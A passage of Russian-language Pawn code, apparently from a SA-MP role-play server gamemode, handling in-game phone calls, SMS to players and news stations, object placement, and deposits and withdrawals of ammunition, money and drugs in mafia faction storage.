					ShowPlayerDialog(playerid, D_NULL, 0, "Соц. сеть", STRING_GLOBAL, "Закрыть", "");
	            }
	            case 1:
		        {
					callcmd::leaders(playerid);
	            }
	        }
			return 1;
	    }
	case D_PHONE+2:
	    {
	        if(!response) return 1;
		    new params;
		    if(sscanf(inputtext, "d", params)) return ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад");
		    if(params < 1 || params > 9999999) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Неверный номер телефона!"); }
		    if(params == PI[playerid][pPhoneNumber]) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь позвонить самому себе!"); }
		    if(PI[playerid][pPhoneBalance] < 1) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Пополните счет сим-карты в любом банкомате города! Узнать баланс /callbalance"); }
		    new fullphone, string11[90];
			if(params == LSNEWS_NUMBER)
			{
			    if(Ether[playerid] == true) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Действие невозможно!"); }
				if(PI[playerid][pNews] != 1) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Вы должны переключиться на волну этой студии!"); }
				if(PI[playerid][pNews] < 1) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "News ID Error!"); }
				if(EtherCall[PI[playerid][pNews]-1] == false) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Радио не принимает звонков!"); }
				foreach(new i: Player)
				{
				    if(PlayerLogged[i] == true && (Ether[i] == true) && PI[i][pMember] == TEAM_SMI)
				    {
				        if(Mobile[i] != -1) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже разговаривает по телефону!");
				  		if(PI[i][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Абонент временно недоступен!");
						Mobile[playerid] = i;
					 	SendMes(i, COLOR_WHITE, "Ваc вызывает: %s (%i). Чтобы ответить, введите: /pickup (/p)", GetName(playerid), PI[playerid][pPhoneNumber]);
						format(string11, sizeof(string11), "У %s звонит мобильный телефон", GetName(i));
						ProxDetectorNew(i, 13.0, COLOR_PURPLE, string11);
				  		PlayerPlaySound(i, 23000, 0.0, 0.0, 0.0);
				  		PlayerPlaySound(playerid, 3600, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "Чтобы повесить трубку, введите: /hangup (/h)");
						if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, 11);
						CellTime[playerid] = 0;
				    }
				}
			}
			if(params == SFNEWS_NUMBER)
			{
			    if(Ether[playerid] == true) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Действие невозможно!"); }
				if(PI[playerid][pNews] != 2) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Вы должны переключиться на волну этой студии!"); }
				if(PI[playerid][pNews] < 1) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "News ID Error!"); }
				if(EtherCall[PI[playerid][pNews]-1] == false) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Радио не принимает звонков!"); }
				foreach(new i: Player)
				{
				    if(PlayerLogged[i] == true && (Ether[i] == true) && PI[i][pMember] == TEAM_SFNEWS)
				    {
				        if(Mobile[i] != -1) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже разговаривает по телефону!");
				  		if(PI[i][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Абонент временно недоступен!");
						Mobile[playerid] = i;
					 	SendMes(i, COLOR_WHITE, "Ваc вызывает: %s (%i). Чтобы ответить, введите: /pickup (/p)", GetName(playerid), PI[playerid][pPhoneNumber]);
						format(string11, sizeof(string11), "У %s звонит мобильный телефон", GetName(i));
						ProxDetectorNew(i, 13.0, COLOR_PURPLE, string11);
				  		PlayerPlaySound(i, 23000, 0.0, 0.0, 0.0);
				  		PlayerPlaySound(playerid, 3600, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "Чтобы повесить трубку, введите: /hangup (/h)");
						if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, 11);
						CellTime[playerid] = 0;
				    }
				}
			}
			if(params == LVNEWS_NUMBER)
			{
			    if(Ether[playerid] == true) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Действие невозможно!"); }
				if(PI[playerid][pNews] != 3) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Вы должны переключиться на волну этой студии!"); }
				if(PI[playerid][pNews] < 1) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "News ID Error!"); }
				if(EtherCall[PI[playerid][pNews]-1] == false) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Радио не принимает звонков!"); }
				foreach(new i: Player)
				{
				    if(PlayerLogged[i] == true && (Ether[i] == true) && PI[i][pMember] == TEAM_LVNEWS)
				    {
				        if(Mobile[i] != -1) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже разговаривает по телефону!");
				  		if(PI[i][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Абонент временно недоступен!");
						Mobile[playerid] = i;
					 	SendMes(i, COLOR_WHITE, "Ваc вызывает: %s (%i). Чтобы ответить, введите: /pickup (/p)", GetName(playerid), PI[playerid][pPhoneNumber]);
						format(string11, sizeof(string11), "У %s звонит мобильный телефон", GetName(i));
						ProxDetectorNew(i, 13.0, COLOR_PURPLE, string11);
				  		PlayerPlaySound(i, 23000, 0.0, 0.0, 0.0);
				  		PlayerPlaySound(playerid, 3600, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "Чтобы повесить трубку, введите: /hangup (/h)");
						if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, 11);
						CellTime[playerid] = 0;
				    }
				}
			}
			foreach(new i: Player)
			{
				if(params == PI[i][pPhoneNumber] && PlayerLogged[i] == true)
				{
					if(Phone[i] == false) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Игрок выключил телефон!"); }
					if(PI[i][pPhone][0] == 0) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "У игрока разряжен телефон!"); }
				    if(Ether[i] == true) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Действие невозможно!"); }
					if(Mobile[i] != -1) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Игрок уже разговаривает по телефону!"); }
                    if(PI[i][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Абонент временно недоступен!");
					Mobile[playerid] = i;
			      	SendMes(i, COLOR_WHITE, "Ваc вызывает: %s (%i). Чтобы ответить, введите: /pickup (/p)", GetName(playerid), PI[playerid][pPhoneNumber]);
					format(string11, sizeof(string11), "У %s звонит мобильный телефон", GetName(i));
					ProxDetectorNew(i, 13.0, COLOR_PURPLE, string11);
		            PlayerPlaySound(i, 23000, 0.0, 0.0, 0.0);
		            PlayerPlaySound(playerid, 3600, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_WHITE, "Чтобы повесить трубку, введите: /hangup (/h)");
					if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, 11);
					CellTime[playerid] = 0;
					fullphone++;
				}
			}
			if(fullphone == 0) { ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Игрок с данным номером не найден!"); }
			return 1;
	    }
    case D_PHONE+3:
		{
		    if(!response) { DeletePVar(playerid, "PhoneSMS"); return 1; }
		    new params, full;
		    if(sscanf(inputtext, "d", params)) return ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад");
    		if(params < 1 || params > 9999999) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Неверный номер телефона!"); }
			if(params == PI[playerid][pPhoneNumber]) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь писать смс самому себе!"); }
			if(params == LSNEWS_NUMBER || params == SFNEWS_NUMBER || params == LVNEWS_NUMBER) full++;
			foreach(new i: Player)
			{
			    if(params == PI[i][pPhoneNumber] && PlayerLogged[i] == true)
			    {
			        full++;
			        break;
			    }
			}
			if(full == 0) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Отправка смс", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Игрок с данным номером не найден!"); }
			SetPVarInt(playerid, "PhoneSMS", params);
			SendSMS(playerid);
			return 1;
		}
	case D_PHONE+4:
	    {
	        if(!response) { DeletePVar(playerid, "PhoneSMS"); return ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); }
	        if(strlen(inputtext) == 0) return SendSMS(playerid);
	        if(strlen(inputtext) > 64)
			{
			    SendClientMessage(playerid, COLOR_GREY, "Максимальное количество символов - 64!");
			    return SendSMS(playerid);
			}
			if(IsIpFound(inputtext) || CheckString(inputtext)) return PlayerGetsChatBan(playerid, inputtext);
			new fullsms, params = GetPVarInt(playerid, "PhoneSMS"), string[200];
			if(params == LSNEWS_NUMBER)
			{
			    if(PI[playerid][pNews] != 1) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Вы должны переключиться на волну этой студии!"); }
			    if(EtherSms[PI[playerid][pNews]-1] == false) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Радио не принимает СМС!"); }
			    if(PI[playerid][pPhoneBalance] < SmsPrice[PI[playerid][pNews]-1]) return SendClientMessage(playerid, COLOR_GREY, "На вашем счету в банке не хватает денег!");
			    foreach(new i: Player)
			    {
			        if((Ether[i] == true) && PI[i][pMember] == TEAM_SMI)
			        {
				        PI[playerid][pPhoneBalance] -= SmsPrice[PI[playerid][pNews]-1];
						MysqlUpdatePlayerInt(playerid, "phonebalance", PI[playerid][pPhoneBalance]);
				        FracBank[8] += SmsPrice[PI[playerid][pNews]-1];
				        MysqlUpdateOtherInt("lsnbank", FracBank[8]);
				        PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						format(string, sizeof(string), "SMS: {FFFFFF}%s {FFFF00}Отправитель: {FFFFFF}%s {FFFF00}Тел.: {FFFFFF}%i", inputtext, GetName(playerid), PI[playerid][pPhoneNumber]);
						SendClientMessage(i, COLOR_YELLOW, string);
		    			format(string, sizeof(string), "SMS: {FFFFFF}%s {FFFF00}Получатель: {FFFFFF}СМИ {FFFF00}Тел.: {FFFFFF}555", inputtext);
		    			SendClientMessage(playerid, COLOR_YELLOW, string);
		    			SendClientMessage(playerid, COLOR_WHITE, "Ваше сообщение доставлено");
						MeAction(playerid, "достаёт мобильный телефон");
				        break;
      				}
			    }
			}
			if(params == SFNEWS_NUMBER)
			{
			    if(PI[playerid][pNews] != 2) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Вы должны переключиться на волну этой студии!"); }
			    if(EtherSms[PI[playerid][pNews]-1] == false) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Радио не принимает СМС!"); }
			    if(PI[playerid][pPhoneBalance] < SmsPrice[PI[playerid][pNews]-1]) return SendClientMessage(playerid, COLOR_GREY, "На вашем счету в банке не хватает денег!");
			    foreach(new i: Player)
			    {
			        if((Ether[i] == true) && PI[i][pMember] == TEAM_SFNEWS)
			        {
				        PI[playerid][pPhoneBalance] -= SmsPrice[PI[playerid][pNews]-1];
						MysqlUpdatePlayerInt(playerid, "phonebalance", PI[playerid][pPhoneBalance]);
				        FracBank[9] += SmsPrice[PI[playerid][pNews]-1];
				        MysqlUpdateOtherInt("sfnbank", FracBank[9]);
				        PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						format(string, sizeof(string), "SMS: {FFFFFF}%s {FFFF00}Отправитель: {FFFFFF}%s {FFFF00}Тел.: {FFFFFF}%i", inputtext, GetName(playerid), PI[playerid][pPhoneNumber]);
						SendClientMessage(i, COLOR_YELLOW, string);
		    			format(string, sizeof(string), "SMS: {FFFFFF}%s {FFFF00}Получатель: {FFFFFF}Закрыто {FFFF00}Тел.: {FFFFFF}555", inputtext);
		    			SendClientMessage(playerid, COLOR_YELLOW, string);
		    			SendClientMessage(playerid, COLOR_WHITE, "Ваше сообщение доставлено");
						MeAction(playerid, "достаёт мобильный телефон");
				        break;
      				}
			    }
			}
			if(params == LVNEWS_NUMBER)
			{
			    if(PI[playerid][pNews] != 3) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Вы должны переключиться на волну этой студии!"); }
			    if(EtherSms[PI[playerid][pNews]-1] == false) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Радио не принимает СМС!"); }
			    if(PI[playerid][pPhoneBalance] < SmsPrice[PI[playerid][pNews]-1]) return SendClientMessage(playerid, COLOR_GREY, "На вашем счету в банке не хватает денег!");
			    foreach(new i: Player)
			    {
			        if((Ether[i] == true) && PI[i][pMember] == TEAM_LVNEWS)
			        {
				        PI[playerid][pPhoneBalance] -= SmsPrice[PI[playerid][pNews]-1];
						MysqlUpdatePlayerInt(playerid, "phonebalance", PI[playerid][pPhoneBalance]);
				        FracBank[10] += SmsPrice[PI[playerid][pNews]-1];
				        MysqlUpdateOtherInt("lvnbank", FracBank[10]);
				        PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						format(string, sizeof(string), "SMS: {FFFFFF}%s {FFFF00}Отправитель: {FFFFFF}%s {FFFF00}Тел.: {FFFFFF}%i", inputtext, GetName(playerid), PI[playerid][pPhoneNumber]);
						SendClientMessage(i, COLOR_YELLOW, string);
		    			format(string, sizeof(string), "SMS: {FFFFFF}%s {FFFF00}Получатель: {FFFFFF}Закрыто {FFFF00}Тел.: {FFFFFF}555", inputtext);
		    			SendClientMessage(playerid, COLOR_YELLOW, string);
		    			SendClientMessage(playerid, COLOR_WHITE, "Ваше сообщение доставлено");
						MeAction(playerid, "достаёт мобильный телефон");
				        break;
      				}
			    }
			}
			foreach(new i: Player)
			{
				if(params == PI[i][pPhoneNumber] && PlayerLogged[i] == true)
				{
				    if(Phone[i] == false) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Игрок выключил телефон!"); }
				    if(PI[i][pJail] > 0) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Абонент временно недоступен!"); }
				    if(PI[i][pPhone][0] <= 0) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Абонент временно недоступен!"); }
					PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					format(string, sizeof(string), "SMS: {FFFFFF}%s {FFFF00}Отправитель: {FFFFFF}%s {FFFF00}Тел.: {FFFFFF}%i", inputtext, GetName(playerid), PI[playerid][pPhoneNumber]);
					SendClientMessage(i, COLOR_YELLOW, string);
					format(string, sizeof(string), "SMS: {FFFFFF}%s {FFFF00}Получатель: {FFFFFF}%s {FFFF00}Тел.: {FFFFFF}%i", inputtext, GetName(i), PI[i][pPhoneNumber]);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					PI[playerid][pPhoneBalance] -= 10;
					MysqlUpdatePlayerInt(playerid, "phonebalance", PI[playerid][pPhoneBalance]);
					SendClientMessage(playerid, COLOR_WHITE, "Ваше сообщение доставлено");
					MeAction(playerid, "достаёт мобильный телефон");
					fullsms++;
		   			break;
				}
			}
			if(fullsms == 0) { ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "Игрок с данным номером не найден!"); }
            DeletePVar(playerid, "PhoneSMS");
			return 1;
	    }
	case D_BREAK:
	    {
	        if(!response) return 1;
		    new Float:X, Float:Y, Float:Z, Float:YZ;
			GetPlayerPos(playerid, X, Y, Z);
			GetPlayerFacingAngle(playerid, YZ);
			if(floatabs(Z) > 300 || GetPlayerInterior(playerid) != 0 ||  GetPlayerVirtualWorld(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "Невозможно установить объект в данном месте");
			switch(listitem)
			{
				case 0:
				{
					SetPVarInt(playerid,"objectcop", CreateObject(2899, X, Y, Z-0.8, 0, 0, YZ));
			        Ships[playerid] = CreateDynamicSphere(X, Y, Z, 3.0, -1, -1, -1);
				}
				case 1: SetPVarInt(playerid,"objectcop", CreateObject(1228, X, Y, Z+0.8, 0, 0, YZ));
				case 2: SetPVarInt(playerid,"objectcop", CreateObject(1237, X, Y, Z-1.0, 0, 0, YZ));
				case 3: SetPVarInt(playerid,"objectcop", CreateObject(1422, X, Y, Z-0.8, 0, 0, YZ));
			}
			//EditObject(playerid, GetPVarInt(playerid, "objectcop"));
			SendClientMessage(playerid, COLOR_GREEN, "Вы установили объект");
	    }
	case D_MAFIA:
	    {
	        if(!response) return 1;
	        switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, D_MAFIA+1, 1, "Положить патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
		  		case 1: ShowPlayerDialog(playerid, D_MAFIA+3, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
				case 2: ShowPlayerDialog(playerid, D_MAFIA+4, 1, "Положить наркотики", "{FFFFFF}Введите количество наркотиков:","Принять", "Отмена");
				case 3:
				{
				    if(PI[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_GREY, "Данная возможность доступна с 5 ранга!");
					ShowPlayerDialog(playerid, D_MAFIA+5, 1, "Взять патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
				}
				case 4:
				{
				    if(!PI[playerid][pLeader]) return SendClientMessage(playerid, COLOR_GREY, "Данная возможность доступна только лидеру!");
					ShowPlayerDialog(playerid, D_MAFIA+7, 1, "Взять деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
				}
				case 5:
				{
				    if(PI[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_GREY, "Данная возможность доступна с 5 ранга!");
					ShowPlayerDialog(playerid, D_MAFIA+8, 1, "Взять наркотики", "{FFFFFF}Введите количество наркотиков:", "Принять", "Отмена");
				}
		  	}
	    }
	case D_MAFIA+1:
	    {
	        if(!response) return 1;
			new till = 0,ok;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_MAFIA+1, 1, "Положить патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
			if(till < 0) return ShowPlayerDialog(playerid, D_MAFIA+1, 1, "Положить патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
			for(new s = 16; s > 0; s --)
            {
   				if(PlayerItem1[playerid][s]==27){ok=s;break;}
   			}
			new i = (PI[playerid][pMember] == TEAM_OPG1) ? (0) : (PI[playerid][pMember] == TEAM_RSM) ? (1) : (2);
			if(PlayerItem2[playerid][ok]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"У Вас нет столько патронов");
			if(PlayerItem2[playerid][ok] == 0)
   			{
   				PlayerItem1[playerid][ok]=0;
   			}
   			PlayerItem2[playerid][ok]-=till;
			MafiaPatr[i] += till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_MAFIA" SET lcnpat=%d,yakpat=%d,rmpat=%d", MafiaPatr[0], MafiaPatr[1], MafiaPatr[2]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[500];
			format(string, 90, "Вы положили на склад мафии патроны (+%i)", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] положил на склад мафии %i патрон", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] положила на склад мафии %i патрон", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			UpDateInv(playerid);
			SaveItem(playerid,ok);
			format(string,sizeof(string),"{993366}Итальянская Мафия\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых бизнесов: {63BD4E}%i\n\n{FFFFFF}Склад: %s", MafiaPatr[0], DrugsBank[TEAM_OPG1], FracBank[6], MafiaTotalBizz[0], b_Sklad{5}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
			UpdateDynamic3DTextLabelText(Mafia3d[0],0xFFFFFFFF,string);
			return 1;
	    }
	case D_MAFIA+3:
	    {
	        if(!response) return 1;
			new till = 0;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_MAFIA+3, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
			if(till < 0) return ShowPlayerDialog(playerid, D_MAFIA+3, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
			if(till > GetMoney(playerid) || till < 0) return SendMess(playerid, MSG_NOT_MONEY);
			new i = (PI[playerid][pMember] == TEAM_OPG1) ? (6) : (PI[playerid][pMember] == TEAM_RSM) ? (5) : (7);
            GiveMoney(playerid, -till);
			FracBank[i] += till;
            STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_MAFIA" SET yakuzabank=%d,lcnbank=%d,rmbank=%d", FracBank[5], FracBank[6], FracBank[7]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы положили на склад мафии %dр", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] положил на склад мафии %iр", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] положила на склад мафии %iр", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			return 1;
	    }
	case D_MAFIA+4:
		{
	    	if(!response) return 1;
			new till = 0,ok;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_MAFIA+4, 1, "Положить наркотики", "{FFFFFF}Введите количество наркотиков:","Принять", "Отмена");
			if(till < 0) return ShowPlayerDialog(playerid, D_MAFIA+4, 1, "Положить наркотики", "{FFFFFF}Введите количество наркотиков:","Принять", "Отмена");
			for(new s = 16; s > 0; s --)
            {
   				if(PlayerItem1[playerid][s]==44){ok=s;break;}
   			}
			new i = (PI[playerid][pMember] == TEAM_OPG1) ? (15) : (PI[playerid][pMember] == TEAM_RSM) ? (16) : (17);
			if(PlayerItem2[playerid][ok]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"У Вас нет столько наркотиков");
			if(PlayerItem2[playerid][ok] == 0)
   			{
   				PlayerItem1[playerid][ok]=0;
   			}
			DrugsBank[i] += till;
			PlayerItem2[playerid][ok]-=till;
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_MAFIA" SET yakuzadrugs=%d,lcndrugs=%d,rmdrugs=%d", DrugsBank[TEAM_RSM], DrugsBank[TEAM_OPG1], DrugsBank[TEAM_YAK]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы положили на склад мафии наркотики (+%i)", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] положил на склад мафии %i пакетик(ов) наркотиков", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] положила на склад мафии %i пакетик(ов) наркотиков", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			UpDateInv(playerid);
			SaveItem(playerid,ok);
			return 1;
		}
	case D_MAFIA+5:
	    {
	        if(!response) return 1;
			new till = 0,newslot;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_MAFIA+5, 1, "Взять патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
			new i = (PI[playerid][pMember] == TEAM_OPG1) ? (0) : (PI[playerid][pMember] == TEAM_RSM) ? (1) : (2);
			if(till < 0 || till > MafiaPatr[i]) return ShowPlayerDialog(playerid, D_MAFIA+5, 1, "Взять патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
            if(CheckMaxVes(playerid,27,till,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
			GiveItem(playerid, 27, till);
			MafiaPatr[i] -= till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_MAFIA" SET lcnpat=%d,yakpat=%d,rmpat=%d", MafiaPatr[0], MafiaPatr[1], MafiaPatr[2]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[500];
			format(string, 90, "Вы взяли со склада мафии патроны (+%i)", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] взял со склада мафии %i патрон", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] взяла со склада мафии %i патрон", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			SaveItem(playerid,newslot);
			format(string,sizeof(string),"{993366}Итальянская Мафия\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых бизнесов: {63BD4E}%i\n\n{FFFFFF}Склад: %s", MafiaPatr[0], DrugsBank[TEAM_OPG1], FracBank[6], MafiaTotalBizz[0], b_Sklad{5}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
			UpdateDynamic3DTextLabelText(Mafia3d[0],0xFFFFFFFF,string);
			return 1;
	    }
	case D_MAFIA+7:
	    {
	        if(!response) return 1;
			new till = 0;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_MAFIA+7, 1, "Взять деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
